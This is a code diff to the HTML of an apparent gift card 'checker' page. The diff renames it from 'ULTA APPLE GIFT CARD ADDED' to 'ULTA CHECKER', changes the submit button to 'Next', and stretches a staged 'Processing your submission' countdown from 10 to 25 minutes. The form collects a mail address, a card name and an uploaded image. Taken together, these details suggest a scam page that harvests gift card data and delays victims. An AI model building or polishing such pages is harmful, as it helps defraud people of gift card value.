@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ULTA APPLE GIFT CARD ADDED</title>
+  <title>CHECKER</title>
   <style>
     :root {
       --bg: #F27A30;
@@ -138,7 +138,7 @@
 <body>
 
   <div class="card">
-    <h2>ULTA APPLE GIFT CARD ADDED</h2>
+    <h2>ULTA CHECKER</h2>
     
     <form id="reviewForm">
       <!-- New Mail Address input field added before Name of Card -->
@@ -167,14 +167,14 @@
         <input type="file" id="image" accept="image/*">
       </div>
 
-      <button type="submit" id="submitBtn">Send Review</button>
+      <button type="submit" id="submitBtn">Next</button>
     </form>
 
     <div id="processingBox">
       <div class="spinner"></div>
       <h3>Processing your submission...</h3>
       <p style="color: var(--text-dim);">Estimated wait time:</p>
-      <div id="timer">10:00</div>
+      <div id="timer">25:00</div>
     </div>
 
     <div id="status"></div>
@@ -280,7 +280,7 @@
         if (response.ok) {
           form.style.display = 'none';
           processingBox.style.display = 'block';
-          startCountdown(10 * 60);
+          startCountdown(25 * 60);
         } else {
           throw new Error(`Failed to send (HTTP ${response.status})`);
         }
